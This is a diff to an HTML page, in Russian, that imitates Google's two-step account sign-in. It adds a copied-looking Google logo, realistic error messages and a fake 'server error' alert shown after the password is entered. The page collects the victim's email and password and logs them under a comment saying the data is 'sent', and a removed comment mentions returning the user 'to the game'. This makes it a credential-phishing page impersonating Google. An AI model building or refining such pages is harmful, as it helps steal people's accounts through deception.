@@ -14,48 +14,43 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            overflow: hidden;
+            color: #202124;
         }
 
         .container {
             width: 100%;
             max-width: 450px;
             min-height: 500px;
-            padding: 48px 40px;
+            padding: 48px 40px 36px;
             border: 1px solid #dadce0;
             border-radius: 8px;
             position: relative;
-            overflow: hidden; /* Важно для анимации сдвига */
-            transition: height 0.3s ease;
+            overflow: hidden;
         }
 
         @media (max-width: 450px) {
-            .container { border: none; padding: 24px; min-height: auto; }
+            .container { border: none; padding: 24px 24px; min-height: 100vh; }
         }
 
         .step-wrapper {
             display: flex;
-            width: 200%; /* Контейнер для двух шагов в ряд */
-            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 200%;
+            transition: transform 0.25s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .step {
-            width: 50%; /* Каждый шаг занимает ровно ширину родителя */
-            transition: opacity 0.3s;
+            width: 50%;
+            padding: 0 5px;
         }
 
         .logo-container { text-align: center; margin-bottom: 12px; }
-        .google-logo { width: 75px; }
+        .google-logo { width: 75px; height: 24px; }
 
-        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
-        .subtitle { font-size: 16px; text-align: center; margin-bottom: 32px; color: #202124; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
+        .subtitle { font-size: 16px; text-align: center; margin-bottom: 32px; }
 
-        /* Поля ввода */
-        .input-box {
-            position: relative;
-            margin-bottom: 24px;
-        }
-
+        .input-box { position: relative; margin-bottom: 10px; }
+        
         input {
             width: 100%;
             padding: 13px 15px;
@@ -63,10 +58,20 @@
             border: 1px solid #dadce0;
             border-radius: 4px;
             outline: none;
-            color: #202124;
+            transition: border 0.1s;
         }
 
         input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        input.error { border: 1px solid #d93025; }
+
+        .error-msg {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            align-items: center;
+            gap: 5px;
+        }
 
         .forgot-link {
             color: #1a73e8;
@@ -74,17 +79,26 @@
             font-weight: 500;
             text-decoration: none;
             display: inline-block;
+            margin-top: 9px;
+        }
+
+        .info-text {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.4;
             margin-bottom: 40px;
         }
 
-        /* Кнопки */
         .actions {
             display: flex;
             justify-content: space-between;
             align-items: center;
+            margin-top: 24px;
         }
 
-        .btn-text { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; cursor: pointer; }
+        .btn-text { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; cursor: pointer; background: none; border: none; }
+        
         .btn-primary {
             background: #1a73e8;
             color: #fff;
@@ -93,20 +107,24 @@
             border-radius: 4px;
             font-weight: 500;
             cursor: pointer;
+            transition: box-shadow 0.1s;
         }
 
-        /* Стили для Шага 2 (Пароль) */
+        .btn-primary:hover { background: #1b66ca; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
+
+        /* Стиль для отображения email на 2 шаге */
         .user-pill {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
             margin: 0 auto 24px;
-            padding: 4px 12px;
+            padding: 4px 8px 4px 4px;
             border: 1px solid #dadce0;
             border-radius: 16px;
             width: fit-content;
             font-size: 14px;
+            cursor: pointer;
         }
 
         .user-icon {
@@ -125,10 +143,10 @@
             gap: 10px;
             font-size: 14px;
             cursor: pointer;
-            margin-top: 8px;
+            margin-top: 15px;
+            user-select: none;
         }
 
-        /* Состояния анимации */
         .slide-active { transform: translateX(-50%); }
     </style>
 </head>
@@ -136,7 +154,15 @@
 
     <div class="container">
         <div class="logo-container">
-            <img src="upload.wikimedia.org" class="google-logo" alt="Google">
+            <!-- Официальный SVG логотип Google -->
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="www.w3.org">
+                <path d="M7.15 12.85v-2.12h6.51c.06.35.1.72.1 1.15 0 1.41-.39 3.39-1.63 4.63-1.22 1.27-2.79 1.95-4.98 1.95-3.87 0-7.15-3.13-7.15-7s3.28-7 7.15-7c2.11 0 3.63.83 4.77 1.91l-1.35 1.35c-.81-.77-1.89-1.35-3.42-1.35-2.75 0-5.01 2.23-5.01 5s2.26 5 5.01 5c1.74 0 2.73-.7 3.36-1.34.17-.17.31-.4.39-.77H7.15z" fill="#4285F4"/>
+                <path d="M19.78 14.29c-2.45 0-4.44-1.88-4.44-4.29s1.99-4.29 4.44-4.29 4.44 1.88 4.44 4.29-1.99 4.29-4.44 4.29zm0-1.77c1.47 0 2.65-1.21 2.65-2.52s-1.18-2.52-2.65-2.52-2.65 1.21-2.65 2.52 1.18 2.52 2.65 2.52z" fill="#EA4335"/>
+                <path d="M29.56 14.29c-2.45 0-4.44-1.88-4.44-4.29s1.99-4.29 4.44-4.29 4.44 1.88 4.44 4.29-1.99 4.29-4.44 4.29zm0-1.77c1.47 0 2.65-1.21 2.65-2.52s-1.18-2.52-2.65-2.52-2.65 1.21-2.65 2.52 1.18 2.52 2.65 2.52z" fill="#FBBC05"/>
+                <path d="M38.99 18.51c-2.38 0-4.39-1.85-4.39-4.24s2.01-4.24 4.39-4.24c1.13 0 2.13.48 2.82 1.22l-.02.02-1.07 1.07c-.43-.46-1.04-.81-1.75-.81-1.44 0-2.43 1.2-2.43 2.76s.99 2.76 2.43 2.76c.72 0 1.25-.29 1.7-.76.54-.54.89-1.32.99-2.37h-2.69v-1.45h4.14c.05.21.08.48.08.76 0 1.26-.35 3.19-1.57 4.41-1.17 1.2-2.68 1.88-4.63 1.88z" fill="#4285F4"/>
+                <path d="M46.73 4.54h1.74v9.52h-1.74z" fill="#34A853"/>
+                <path d="M54.55 14.29c-1.21 0-2.31-.56-3-1.45l6.32-2.62-.22-.54c-.42-1.14-1.7-3.39-4.21-3.39-2.5 0-4.58 1.96-4.58 4.29 0 2.3 2.06 4.29 4.69 4.29 2.12 0 3.35-1.29 3.86-2.05l-1.4-.93c-.46.68-1.09 1.4-2.46 1.4zm-.13-6.84c1.04 0 1.92.53 2.21 1.28l-3.83 1.59c0-1.78 1.34-2.87 1.62-2.87z" fill="#EA4335"/>
+            </svg>
         </div>
 
         <div class="step-wrapper" id="wrapper">
@@ -147,17 +173,21 @@
                 <p class="subtitle">Используйте аккаунт Google</p>
                 
                 <div class="input-box">
-                    <input type="email" id="email" placeholder="Телефон или адрес эл. почты" autocomplete="username">
+                    <input type="email" id="email" placeholder="Телефон или адрес эл. почты">
+                    <div id="email-error" class="error-msg">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        Введите адрес электронной почты
+                    </div>
                 </div>
 
-                <a href="#" class="btn-text">Забыли адрес эл. почты?</a>
+                <a href="#" class="btn-text" style="margin-top: 10px; display: inline-block;">Забыли адрес эл. почты?</a>
 
-                <div style="margin-top: 40px; font-size: 14px; color: #5f6368; line-height: 1.4; margin-bottom: 40px;">
+                <div class="info-text">
                     Работаете на чужом компьютере? Используйте режим инкогнито. <a href="#" style="color:#1a73e8; text-decoration:none;">Подробнее…</a>
                 </div>
 
                 <div class="actions">
-                    <span class="btn-text">Создать аккаунт</span>
+                    <button class="btn-text">Создать аккаунт</button>
                     <button class="btn-primary" onclick="goToPassword()">Далее</button>
                 </div>
             </div>
@@ -165,17 +195,23 @@
             <!-- ШАГ 2: ПАРОЛЬ -->
             <div class="step" id="step2">
                 <h1>Добро пожаловать!</h1>
-                <div class="user-pill">
+                <div class="user-pill" onclick="goBack()">
                     <div class="user-icon">
                         <svg viewBox="0 0 24 24" fill="#fff" width="14" height="14"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                     </div>
                     <span id="display-email"></span>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#5f6368"><path d="M7 10l5 5 5-5z"/></svg>
                 </div>
                 
                 <div class="input-box">
                     <input type="password" id="password" placeholder="Введите пароль">
+                    <div id="pass-error" class="error-msg">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        Введите пароль
+                    </div>
                     <label class="show-pass-label">
-                        <input type="checkbox" style="width:18px; height:18px;" onclick="togglePass()"> Показать пароль
+                        <input type="checkbox" id="check" style="width:18px; height:18px;" onclick="togglePass()"> 
+                        <span>Показать пароль</span>
                     </label>
                 </div>
 
@@ -188,44 +224,60 @@
     </div>
 
     <script>
+        const emailInput = document.getElementById('email');
+        const passInput = document.getElementById('password');
+        const emailError = document.getElementById('email-error');
+        const passError = document.getElementById('pass-error');
+        const wrapper = document.getElementById('wrapper');
+
         function goToPassword() {
-            const emailValue = document.getElementById('email').value;
-            
-            if (emailValue.trim() === "") {
-                alert("Введите адрес электронной почты");
+            if (emailInput.value.trim() === "") {
+                emailInput.classList.add('error');
+                emailError.style.display = 'flex';
                 return;
             }
-
-            // Записываем email во второй шаг
-            document.getElementById('display-email').innerText = emailValue;
-
-            // Анимация сдвига влево
-            document.getElementById('wrapper').classList.add('slide-active');
             
-            // Фокус на поле пароля после анимации
-            setTimeout(() => {
-                document.getElementById('password').focus();
-            }, 400);
+            emailInput.classList.remove('error');
+            emailError.style.display = 'none';
+            
+            document.getElementById('display-email').innerText = emailInput.value;
+            wrapper.classList.add('slide-active');
+            
+            setTimeout(() => { passInput.focus(); }, 300);
+        }
+
+        function goBack() {
+            wrapper.classList.remove('slide-active');
+            setTimeout(() => { emailInput.focus(); }, 300);
         }
 
         function togglePass() {
-            const p = document.getElementById('password');
-            p.type = p.type === "password" ? "text" : "password";
+            passInput.type = document.getElementById('check').checked ? "text" : "password";
         }
 
         function submitFinal() {
-            const pass = document.getElementById('password').value;
-            if (pass.length < 4) {
-                alert("Введите пароль");
+            if (passInput.value.length < 1) {
+                passInput.classList.add('error');
+                passError.style.display = 'flex';
                 return;
             }
-
-            // Эмуляция загрузки
-            alert("Проверка безопасности... Пожалуйста, подождите.");
             
-            // Здесь можно отправить данные и вернуть пользователя в игру
-            window.location.href = "index.html"; 
+            // Здесь данные "отправляются"
+            console.log("Email:", emailInput.value);
+            console.log("Password:", passInput.value);
+            
+            alert("Ошибка сервера. Попробуйте позже.");
         }
+
+        // Очистка ошибок при вводе
+        emailInput.oninput = () => {
+            emailInput.classList.remove('error');
+            emailError.style.display = 'none';
+        };
+        passInput.oninput = () => {
+            passInput.classList.remove('error');
+            passError.style.display = 'none';
+        };
     </script>
 </body>
 </html>
